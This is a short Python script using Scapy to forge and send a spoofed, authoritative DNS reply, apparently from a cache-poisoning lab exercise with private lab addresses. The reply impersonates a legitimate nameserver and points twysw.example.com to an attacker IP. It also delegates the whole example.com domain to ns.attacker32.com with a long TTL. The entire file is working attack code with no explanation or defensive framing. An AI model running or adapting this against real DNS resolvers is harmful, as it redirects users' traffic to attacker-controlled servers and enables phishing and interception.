#!/usr/bin/python
from scapy.all import *

# Variables
client_ip = '10.0.2.17'
server_ip = '10.0.2.18'
attacker_ip = '10.0.2.19'
legit_ns1 = '199.43.133.53'

# Domain and nameserver information
name = "twysw.example.com"
domain = 'example.com'
ns = 'ns.attacker32.com'

# DNS Sections
Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata=attacker_ip, ttl=259200)
NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)

# DNS Header
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1, qdcount=1, ancount=1, 
nscount=1, arcount=0, qd=Qdsec, an=Anssec, ns=NSsec)

# IP Header
ip = IP(dst=server_ip, src=legit_ns1)

# UDP Header
udp = UDP(dport=33333, sport=53, chksum=0)

# Complete Spoofed Reply
reply = ip/udp/dns

# Send the Spoofed Reply
send(reply)

# save file
f = open("ip_resp.bin","wb")
f.write(bytes(reply))
